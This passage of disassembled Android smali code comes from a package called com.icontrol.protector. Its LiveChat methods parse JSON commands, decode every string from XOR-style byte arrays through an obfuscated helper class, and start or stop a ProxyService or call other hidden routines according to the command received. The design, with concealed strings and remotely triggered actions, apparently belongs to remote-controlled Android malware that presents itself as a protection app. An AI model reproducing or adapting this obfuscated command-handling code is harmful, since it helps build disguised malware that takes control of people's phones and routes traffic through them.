        -0x7ct
        0x14t
    .end array-data

    :array_18
    .array-data 1
        -0x49t
        0x1ft
        0x71t
        -0x5dt
        0x1ct
        -0x55t
        0x0t
        -0x6bt
        -0x61t
    .end array-data

    nop

    :array_19
    .array-data 1
        -0x6t
        0x70t
        0x7t
        -0x3at
        0x3ct
        -0x13t
        0x69t
        -0x7t
    .end array-data

    :array_1a
    .array-data 1
        -0x2ft
        -0x42t
        0x43t
        0x7dt
        -0x3dt
        -0x32t
        0x5t
        0x59t
        -0x6t
        -0x42t
        0x59t
        0x76t
        -0x3ft
    .end array-data

    nop

    :array_1b
    .array-data 1
        -0x67t
        -0x21t
        0x2dt
        0x19t
        -0x51t
        -0x55t
        0x49t
        0x36t
    .end array-data
.end method

.method private j(Lorg/json/JSONObject;)V
    .locals 10

    .line 1
    const/16 v0, 0x8

    :try_start_0
    sget-object v1, Lcom/icontrol/protector/k$a;->g:Lcom/icontrol/protector/k$a;

    invoke-static {v1}, Lcom/icontrol/protector/k;->b(Lcom/icontrol/protector/k$a;)[Ljava/lang/String;

    move-result-object v1

    iget-object v2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v2, v1}, Lcom/icontrol/protector/k;->e(Landroid/content/Context;[Ljava/lang/String;)Z

    move-result v1

    if-nez v1, :cond_0

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    const/16 v1, 0xa

    new-array v1, v1, [B

    fill-array-data v1, :array_0

    new-array v2, v0, [B

    fill-array-data v2, :array_1

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    const/16 v2, 0x25

    new-array v2, v2, [B

    fill-array-data v2, :array_2

    new-array v3, v0, [B

    fill-array-data v3, :array_3

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-static {p1, v1, v2}, Lcom/icontrol/protector/WorkServices$d;->a(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    return-void

    :catch_0
    move-exception p1

    goto/16 :goto_2

    :cond_0
    const/4 v1, 0x4

    new-array v2, v1, [B

    fill-array-data v2, :array_4

    new-array v3, v0, [B

    fill-array-data v3, :array_5

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    const/4 v3, 0x5

    new-array v4, v3, [B

    fill-array-data v4, :array_6

    new-array v5, v0, [B

    fill-array-data v5, :array_7

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v2}, Ljava/lang/String;->hashCode()I

    move-result v4

    const/16 v5, 0x9df

    const/4 v6, 0x0

    const/4 v7, 0x1

    const/4 v8, 0x3

    const/4 v9, 0x2

    if-eq v4, v5, :cond_6

    const/16 v5, 0xc6c

    if-eq v4, v5, :cond_5

    const/16 v5, 0xe0a

    if-eq v4, v5, :cond_4

    const v5, 0x1314f

    if-eq v4, v5, :cond_3

    const/16 v5, 0xc6f

    if-eq v4, v5, :cond_2

    const/16 v5, 0xc70

    if-eq v4, v5, :cond_1

    goto/16 :goto_0

    :cond_1
    new-array v4, v9, [B

    fill-array-data v4, :array_8

    new-array v5, v0, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    move v2, v3

    goto/16 :goto_1

    :cond_2
    new-array v4, v9, [B

    fill-array-data v4, :array_a

    new-array v5, v0, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    move v2, v1

    goto :goto_1

    :cond_3
    new-array v4, v8, [B

    fill-array-data v4, :array_c

    new-array v5, v0, [B

    fill-array-data v5, :array_d

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    move v2, v7

    goto :goto_1

    :cond_4
    new-array v4, v9, [B

    fill-array-data v4, :array_e

    new-array v5, v0, [B

    fill-array-data v5, :array_f

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    move v2, v8

    goto :goto_1

    :cond_5
    new-array v4, v9, [B

    fill-array-data v4, :array_10

    new-array v5, v0, [B

    fill-array-data v5, :array_11

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    move v2, v9

    goto :goto_1

    :cond_6
    new-array v4, v9, [B

    fill-array-data v4, :array_12

    new-array v5, v0, [B

    fill-array-data v5, :array_13

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v2

    if-eqz v2, :cond_7

    move v2, v6

    goto :goto_1

    :cond_7
    :goto_0
    const/4 v2, -0x1

    :goto_1
    if-eqz v2, :cond_d

    if-eq v2, v7, :cond_c

    if-eq v2, v9, :cond_b

    if-eq v2, v8, :cond_a

    if-eq v2, v1, :cond_9

    if-eq v2, v3, :cond_8

    goto/16 :goto_3

    :cond_8
    new-array v1, v1, [B

    fill-array-data v1, :array_14

    new-array v2, v0, [B

    fill-array-data v2, :array_15

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v3, [B

    fill-array-data v2, :array_16

    new-array v3, v0, [B

    fill-array-data v3, :array_17

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/kp;->b(I)V

    goto/16 :goto_3

    :cond_9
    new-array v1, v3, [B

    fill-array-data v1, :array_18

    new-array v2, v0, [B

    fill-array-data v2, :array_19

    invoke-static {v1, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    new-array v2, v3, [B

    fill-array-data v2, :array_1a

    new-array v3, v0, [B

    fill-array-data v3, :array_1b

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {p1, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-static {p1}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/Integer;->intValue()I

    move-result p1

    invoke-static {p1}, Lntidisestablish/neumonoul/floccinaucinih/kp;->a(I)V

    goto/16 :goto_3

    :cond_a
    invoke-static {v7}, Lntidisestablish/neumonoul/floccinaucinih/kp;->c(Z)V

    goto/16 :goto_3

    :cond_b
    invoke-static {v6}, Lntidisestablish/neumonoul/floccinaucinih/kp;->c(Z)V

    goto/16 :goto_3

    :cond_c
    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/kp;->e()V

    goto/16 :goto_3

    :cond_d
    invoke-static {}, Lntidisestablish/neumonoul/floccinaucinih/kp;->e()V

    invoke-static {v6}, Lntidisestablish/neumonoul/floccinaucinih/kp;->c(Z)V

    new-array v2, v3, [B

    fill-array-data v2, :array_1c

    new-array v4, v0, [B

    fill-array-data v4, :array_1d

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v3, [B

    fill-array-data v4, :array_1e

    new-array v5, v0, [B

    fill-array-data v5, :array_1f

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {p1, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    new-array v4, v1, [B

    fill-array-data v4, :array_20

    new-array v5, v0, [B

    fill-array-data v5, :array_21

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    new-array v5, v3, [B

    fill-array-data v5, :array_22

    new-array v6, v0, [B

    fill-array-data v6, :array_23

    invoke-static {v5, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {p1, v4, v5}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    new-array v3, v3, [B

    fill-array-data v3, :array_24

    new-array v5, v0, [B

    fill-array-data v5, :array_25

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    new-array v1, v1, [B

    fill-array-data v1, :array_26

    new-array v5, v0, [B

    fill-array-data v5, :array_27

    invoke-static {v1, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v3, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    iget-object v1, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v2, v4, p1, v1}, Lntidisestablish/neumonoul/floccinaucinih/kp;->d(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_3

    :goto_2
    const/16 v1, 0xd

    new-array v1, v1, [B

    fill-array-data v1, :array_28

    new-array v0, v0, [B

    fill-array-data v0, :array_29

    invoke-static {v1, v0}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :goto_3
    return-void

    :array_0
    .array-data 1
        -0x3et
        0x6ct
        -0x19t
        0x6t
        -0x71t
        0x6dt
        0x4bt
        -0x4t
        -0x1ft
        0x60t
    .end array-data

    nop

    :array_1
    .array-data 1
        -0x71t
        0x5t
        -0x7ct
        0x74t
        -0x20t
        0x1dt
        0x23t
        -0x6dt
    .end array-data

    :array_2
    .array-data 1
        0x4bt
        0x2bt
        0x7t
        0x11t
        0x11t
        -0x2ct
        0x3t
        0x60t
        0x68t
        0x27t
        0x44t
        0x33t
        0x1bt
        -0x2at
        0x6t
        0x66t
        0x75t
        0x31t
        0xdt
        0xct
        0x10t
        -0x7ct
        0x2t
        0x7ct
        0x26t
        0x2ct
        0xbt
        0x17t
        0x5et
        -0x1ft
        0x5t
        0x6et
        0x64t
        0x2et
        0x1t
        0x7t
        0x50t
    .end array-data

    nop

    :array_3
    .array-data 1
        0x6t
        0x42t
        0x64t
        0x63t
        0x7et
        -0x5ct
        0x6bt
        0xft
    .end array-data

    :array_4
    .array-data 1
        0x4bt
        -0x4ct
        -0x38t
        0x2ct
    .end array-data

    :array_5
    .array-data 1
        0x38t
        -0x3ft
        -0x56t
        0x4ft
        -0x1t
        -0x33t
        -0x2ft
        -0x46t
    .end array-data

    :array_6
    .array-data 1
        -0xct
        0x6ct
        -0x7dt
        0xct
        0x7et
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x6ft
        0x1t
        -0xdt
        0x78t
        0x7t
        -0x31t
        -0x7t
        0x3bt
    .end array-data

    :array_8
    .array-data 1
        -0x7t
        -0x5dt
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x66t
        -0x30t
        0x7ft
        0xat
        -0x2dt
        0x73t
        -0x57t
        -0x21t
    .end array-data

    :array_a
    .array-data 1
        0x9t
        0x2ct
    .end array-data

    nop

    :array_b
    .array-data 1
        0x6at
        0x5et
        -0x79t
        0x6bt
        0xft
        -0xet
        0x29t
        0x35t
    .end array-data

    :array_c
    .array-data 1
        0x47t
        -0x80t
        0x30t
    .end array-data

    :array_d
    .array-data 1
        0x8t
        -0x3at
        0x76t
        0x77t
        0x5ct
        0x2ft
        -0x26t
        -0x25t
    .end array-data

    :array_e
    .array-data 1
        0x29t
        0x22t
    .end array-data

    nop

    :array_f
    .array-data 1
        0x59t
        0x58t
        -0x31t
        0x79t
        -0x10t
        -0x74t
        -0x3ct
        -0x50t
    .end array-data

    :array_10
    .array-data 1
        0x7t
        0x24t
    .end array-data

    nop

    :array_11
    .array-data 1
        0x64t
        0x4bt
        0x76t
        -0x39t
        0x68t
        -0x38t
        0x48t
        -0x21t
    .end array-data

    :array_12
    .array-data 1
        0x67t
        -0x4ft
    .end array-data

    nop

    :array_13
    .array-data 1
        0x28t
        -0x1t
        0x73t
        -0x74t
        -0x76t
        -0x72t
        0x32t
        -0x70t
    .end array-data

    :array_14
    .array-data 1
        -0x4bt
        0x70t
        0x57t
        0x3et
    .end array-data

    :array_15
    .array-data 1
        -0xct
        0x3t
        0x25t
        0x5dt
        -0x5et
        -0x60t
        -0x77t
        0x73t
    .end array-data

    :array_16
    .array-data 1
        -0x63t
        0x4dt
        0x43t
        -0x49t
        -0x79t
    .end array-data

    nop

    :array_17
    .array-data 1
        -0x8t
        0x20t
        0x33t
        -0x3dt
        -0x2t
        0x3at
        0x3dt
        -0x3t
    .end array-data

    :array_18
    .array-data 1
        0x2ft
        0x23t
        -0x74t
        -0x39t
        -0x7at
    .end array-data

    nop

    :array_19
    .array-data 1
        0x6et
        0x51t
        -0x13t
        -0x4dt
        -0x1dt
        -0x1at
        -0x72t
        -0x5et
    .end array-data

    :array_1a
    .array-data 1
        -0x59t
        0x3t
        0x5bt
        -0x7at
        0x2dt
    .end array-data

    nop

    :array_1b
    .array-data 1
        -0x3et
        0x6et
        0x2bt
        -0xet
        0x54t
        -0x29t
        -0x3et
        0x1ft
    .end array-data

    :array_1c
    .array-data 1
        -0x5t
        0xbt
        -0x43t
        -0x30t
        -0x7ft
    .end array-data

    nop

    :array_1d
    .array-data 1
        -0x46t
        0x79t
        -0x24t
        -0x5ct
        -0x1ct
        -0x14t
        0x3t
        -0x61t
    .end array-data

    :array_1e
    .array-data 1
        -0x48t
        0x33t
        0x54t
        0x4t
        -0x1ct
    .end array-data

    nop

    :array_1f
    .array-data 1
        -0x23t
        0x5et
        0x24t
        0x70t
        -0x63t
        0x6et
        -0xdt
        0x3ct
    .end array-data

    :array_20
    .array-data 1
        0x6bt
        0x48t
        -0x61t
        -0x18t
    .end array-data

    :array_21
    .array-data 1
        0x2at
        0x3bt
        -0x13t
        -0x75t
        0x48t
        0x45t
        -0x27t
        -0x17t
    .end array-data

    :array_22
    .array-data 1
        -0x49t
        0x13t
        -0x4ct
        0x6ft
        -0x4ft
    .end array-data

    nop

    :array_23
    .array-data 1
        -0x2et
        0x7et
        -0x3ct
        0x1bt
        -0x38t
        -0x38t
        -0x73t
        -0x25t
    .end array-data

    :array_24
    .array-data 1
        -0x74t
        -0x42t
        0x60t
        0x1bt
        -0x6et
    .end array-data

    nop

    :array_25
    .array-data 1
        -0x1t
        -0x2bt
        0x9t
        0x7ft
        -0xct
        0x71t
        0x28t
        -0x67t
    .end array-data

    :array_26
    .array-data 1
        -0x26t
        0x57t
        0x20t
        -0x3dt
    .end array-data

    :array_27
    .array-data 1
        -0x4ct
        0x22t
        0x4ct
        -0x51t
        -0x3et
        -0x59t
        -0x22t
        0x5dt
    .end array-data

    :array_28
    .array-data 1
        -0x50t
        0x3at
        -0x16t
        -0x3at
        0x5ft
        0x42t
        0x3at
        0x36t
        -0x65t
        0x3at
        -0x10t
        -0x33t
        0x5dt
    .end array-data

    nop

    :array_29
    .array-data 1
        -0x8t
        0x5bt
        -0x7ct
        -0x5et
        0x33t
        0x27t
        0x76t
        0x59t
    .end array-data
.end method

.method private k(Lorg/json/JSONObject;)V
    .locals 6

    .line 1
    const/4 v0, 0x4

    const/16 v1, 0x8

    :try_start_0
    new-array v0, v0, [B

    fill-array-data v0, :array_0

    new-array v2, v1, [B

    fill-array-data v2, :array_1

    invoke-static {v0, v2}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    const/4 v2, 0x1

    new-array v3, v2, [B

    const/16 v4, 0x59

    const/4 v5, 0x0

    aput-byte v4, v3, v5

    new-array v4, v1, [B

    fill-array-data v4, :array_2

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p1, v0, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    invoke-virtual {p1}, Ljava/lang/String;->hashCode()I

    move-result v0

    const/16 v3, 0x30

    if-eq v0, v3, :cond_1

    const/16 v3, 0x31

    if-eq v0, v3, :cond_0

    goto :goto_0

    :cond_0
    new-array v0, v2, [B

    const/16 v3, -0x5b

    aput-byte v3, v0, v5

    new-array v3, v1, [B

    fill-array-data v3, :array_3

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    goto :goto_1

    :catch_0
    move-exception p1

    goto :goto_2

    :cond_1
    new-array v0, v2, [B

    const/16 v3, 0x5a

    aput-byte v3, v0, v5

    new-array v3, v1, [B

    fill-array-data v3, :array_4

    invoke-static {v0, v3}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    if-eqz p1, :cond_2

    move v5, v2

    goto :goto_1

    :cond_2
    :goto_0
    const/4 v5, -0x1

    :goto_1
    const-class p1, Lcom/icontrol/protector/ProxyService;

    if-eqz v5, :cond_4

    if-eq v5, v2, :cond_3

    goto :goto_3

    :cond_3
    :try_start_1
    new-instance v0, Landroid/content/Intent;

    iget-object v2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-direct {v0, v2, p1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {p1, v0}, Landroid/content/Context;->stopService(Landroid/content/Intent;)Z

    goto :goto_3

    :cond_4
    iget-object v0, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-static {v0, p1}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v0

    if-nez v0, :cond_6

    new-instance v0, Landroid/content/Intent;

    iget-object v2, p0, Lcom/icontrol/protector/LiveChat$a;->c:Landroid/content/Context;

    invoke-direct {v0, v2, p1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v2, 0x1a

    if-lt p1, v2, :cond_5

    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-static {p1, v0}, Lntidisestablish/neumonoul/floccinaucinih/on;->a(Lcom/icontrol/protector/LiveChat;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_3

    :cond_5
    iget-object p1, p0, Lcom/icontrol/protector/LiveChat$a;->d:Lcom/icontrol/protector/LiveChat;

    invoke-virtual {p1, v0}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_3

    :goto_2
    const/16 v0, 0xb

    new-array v0, v0, [B

    fill-array-data v0, :array_5

    new-array v1, v1, [B

    fill-array-data v1, :array_6

    invoke-static {v0, v1}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    invoke-virtual {p1}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    :cond_6
    :goto_3
    return-void

    nop

    :array_0
    .array-data 1
        0x34t
        -0x59t
        0x20t
        -0x61t
    .end array-data

    :array_1
    .array-data 1
        0x47t
        -0x2et
        0x42t
        -0x4t
        -0x4dt
        -0x47t
        -0x16t
        0x1dt
    .end array-data

    :array_2
    .array-data 1
        0x69t
        -0x39t
        -0x35t
        -0x5ft
        -0xet
        -0x4bt
        0x3t
        -0x58t
    .end array-data

    :array_3
    .array-data 1
        -0x6ct
        -0x50t
        0x77t
        -0x60t
        -0x12t
        0x77t
        -0x21t
        -0x3bt
    .end array-data

    :array_4
    .array-data 1
        0x6at
        0x15t
        -0x2dt
        -0x57t
        0x25t
        0x74t
        -0x4at
        -0x1et
    .end array-data

    :array_5
    .array-data 1
        0x72t
        -0x34t
        0x3ct
        -0x3dt
        -0x6t
        0x55t
        0x41t
        -0x31t
        0x55t
        -0x2bt
        0x2bt
    .end array-data

    :array_6
    .array-data 1
        0x3at
        -0x53t
        0x52t
        -0x59t
        -0x6at
        0x30t
        0x11t
        -0x43t
    .end array-data
.end method

.method private l(Lorg/json/JSONObject;)V
    .locals 17

    .line 1
    move-object/from16 v1, p0

    move-object/from16 v0, p1

    const-string v2, ""

    const/16 v3, 0xc

    const/4 v4, 0x4

    const/16 v5, 0x8

    :try_start_0
    new-array v6, v4, [B

    fill-array-data v6, :array_0

    new-array v7, v5, [B

    fill-array-data v7, :array_1

    invoke-static {v6, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v6

    const/4 v7, 0x5

    new-array v8, v7, [B

    fill-array-data v8, :array_2

    new-array v9, v5, [B

    fill-array-data v9, :array_3

    invoke-static {v8, v9}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v0, v6, v8}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v6}, Ljava/lang/String;->hashCode()I

    move-result v8

    const/16 v9, 0xa

    const/16 v11, 0x9

    const/4 v12, 0x2

    const/4 v13, 0x7

    const/4 v14, 0x3

    const/4 v15, 0x0

    const/4 v10, 0x1

    sparse-switch v8, :sswitch_data_0

    goto/16 :goto_0

    :sswitch_0
    new-array v8, v13, [B

    fill-array-data v8, :array_4

    new-array v11, v5, [B

    fill-array-data v11, :array_5

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v14

    goto/16 :goto_1

    :catch_0
    move-exception v0

    goto/16 :goto_7

    :sswitch_1
    new-array v8, v11, [B

    fill-array-data v8, :array_6

    new-array v11, v5, [B

    fill-array-data v11, :array_7

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v12

    goto/16 :goto_1

    :sswitch_2
    new-array v8, v7, [B

    fill-array-data v8, :array_8

    new-array v11, v5, [B

    fill-array-data v11, :array_9

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v10

    goto/16 :goto_1

    :sswitch_3
    new-array v8, v7, [B

    fill-array-data v8, :array_a

    new-array v11, v5, [B

    fill-array-data v11, :array_b

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v15

    goto/16 :goto_1

    :sswitch_4
    new-array v8, v4, [B

    fill-array-data v8, :array_c

    new-array v11, v5, [B

    fill-array-data v11, :array_d

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v7

    goto/16 :goto_1

    :sswitch_5
    new-array v8, v14, [B

    fill-array-data v8, :array_e

    new-array v11, v5, [B

    fill-array-data v11, :array_f

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    const/4 v11, 0x6

    goto/16 :goto_1

    :sswitch_6
    new-array v8, v14, [B

    fill-array-data v8, :array_10

    new-array v11, v5, [B

    fill-array-data v11, :array_11

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v5

    goto :goto_1

    :sswitch_7
    new-array v8, v14, [B

    fill-array-data v8, :array_12

    new-array v11, v5, [B

    fill-array-data v11, :array_13

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v4

    goto :goto_1

    :sswitch_8
    new-array v8, v12, [B

    fill-array-data v8, :array_14

    new-array v11, v5, [B

    fill-array-data v11, :array_15

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v13

    goto :goto_1

    :sswitch_9
    new-array v8, v10, [B

    const/16 v11, 0x2d

    aput-byte v11, v8, v15

    new-array v11, v5, [B

    fill-array-data v11, :array_16

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    move v11, v9

    goto :goto_1

    :sswitch_a
    new-array v8, v10, [B

    const/16 v16, -0x46

    aput-byte v16, v8, v15

    new-array v11, v5, [B

    fill-array-data v11, :array_17

    invoke-static {v8, v11}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_0

    const/16 v11, 0x9

    goto :goto_1

    :cond_0
    :goto_0
    const/4 v11, -0x1

    :goto_1
    packed-switch v11, :pswitch_data_0

    goto/16 :goto_8

    :pswitch_0
    new-array v2, v4, [B

    fill-array-data v2, :array_18

    new-array v4, v5, [B

    fill-array-data v4, :array_19

    invoke-static {v2, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v2

    new-array v4, v7, [B

    fill-array-data v4, :array_1a

    new-array v6, v5, [B

    fill-array-data v6, :array_1b

    invoke-static {v4, v6}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v0, v2, v4}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

